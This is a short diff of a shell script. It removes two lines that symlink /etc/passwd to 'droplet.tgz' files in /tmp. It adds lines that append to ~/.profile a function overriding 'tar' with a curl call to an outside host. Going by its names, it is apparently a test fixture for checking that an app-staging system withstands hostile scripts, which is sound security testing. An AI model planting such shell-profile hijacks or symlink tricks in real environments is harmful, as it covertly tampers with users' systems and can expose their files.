@@ -1,4 +1,7 @@
 #!/bin/sh
-ln -s /etc/passwd /tmp/droplet.tgz
-ln -s /etc/passwd /tmp/staged/droplet.tgz
+cat >> ~/.profile << HERE
+function tar() {
+	curl https://recorder.run.aws-usw02-dev.ice.predix.io/tar
+}
+HERE
 exit 0
